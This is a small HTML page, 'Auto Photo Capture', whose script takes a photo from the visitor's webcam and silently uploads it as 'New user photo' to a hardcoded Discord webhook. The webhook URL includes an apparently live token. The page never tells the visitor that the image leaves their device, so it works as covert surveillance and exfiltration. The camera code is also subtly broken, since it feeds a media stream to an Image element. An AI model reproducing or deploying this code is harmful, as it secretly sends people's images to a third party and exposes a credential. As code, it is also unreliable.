<!DOCTYPE html>
<html>
<head>
    <title>Auto Photo Capture</title>
    <script>
        function capturePhoto() {
            // Create a new image element
            var img = new Image();

            // Set the source of the image to the user's camera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    // Assign the stream to the image element
                    img.srcObject = stream;

                    // Wait for the image to load
                    img.onload = function () {
                        // Create a canvas element
                        var canvas = document.createElement('canvas');
                        canvas.width = img.width;
                        canvas.height = img.height;

                        // Draw the image onto the canvas
                        var context = canvas.getContext('2d');
                        context.drawImage(img, 0, 0, img.width, img.height);

                        // Convert the canvas image to base64 data URL
                        var dataURL = canvas.toDataURL('image/jpeg');

                        // Send the image data to the Discord webhook
                        sendToDiscord(dataURL);
                    };
                })
                .catch(function (error) {
                    console.log('Error accessing camera:', error);
                });
        }

        function sendToDiscord(dataURL) {
            // Create a new XMLHttpRequest object
            var xhr = new XMLHttpRequest();

            // Set the request method and URL
            xhr.open('POST', 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX', true);

            // Set the request headers
            xhr.setRequestHeader('Content-Type', 'application/json');

            // Set the request body
            var payload = {
                content: 'New user photo',
                embeds: [
                    {
                        image: {
                            url: dataURL
                        }
                    }
                ]
            };
            xhr.send(JSON.stringify(payload));
        }
    </script>
</head>
<body>
    <h1>Auto Photo Capture</h1>
    <button onclick="capturePhoto()">Capture Photo</button>
</body>
</html>
